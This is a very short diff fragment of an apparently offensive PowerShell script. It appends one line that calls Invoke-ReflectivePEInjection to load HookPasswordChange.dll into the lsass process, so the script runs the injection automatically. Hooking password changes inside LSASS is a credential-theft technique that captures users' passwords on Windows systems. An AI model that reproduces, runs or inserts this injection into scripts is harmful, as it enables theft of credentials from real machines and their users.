@@ -2947,3 +2947,4 @@ Function Main
 
 Main
 }
+Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -ProcName lsass
